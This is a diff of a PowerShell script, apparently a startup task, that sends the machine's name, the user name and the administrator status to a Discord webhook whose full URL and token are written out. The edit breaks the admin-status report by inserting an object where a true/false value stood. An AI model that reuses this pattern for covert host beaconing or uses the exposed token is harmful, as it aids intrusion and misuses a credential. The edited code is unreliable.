@@ -1,13 +1,13 @@
 $webhookUrl = "https://discordapp.com/api/webhooks/1345713305398022257/8WDyAFlcQk-2fwOp4MW87lebVGb9a2HOcx_OYISl4eMXMeLMTjKPcZKaDj_gPBREx0P5"
 $computerName = $env:COMPUTERNAME
 $username = $env:USERNAME
-$isAdmin = [Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent().IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-if ($isAdmin) { $adminStatus = $true } else { $adminStatus = $false }
+$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+$currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 $message = @{
     embeds = @(
         @{
             title = "Script runned"
-            description = "*Script runned with Windows start - administator status : $adminStatus*."
+            description = "*Script runned with Windows start - administator status : $currentPrincipal*."
             color = 333333 # Цвет в десятичном формате
             fields = @(
                 @{
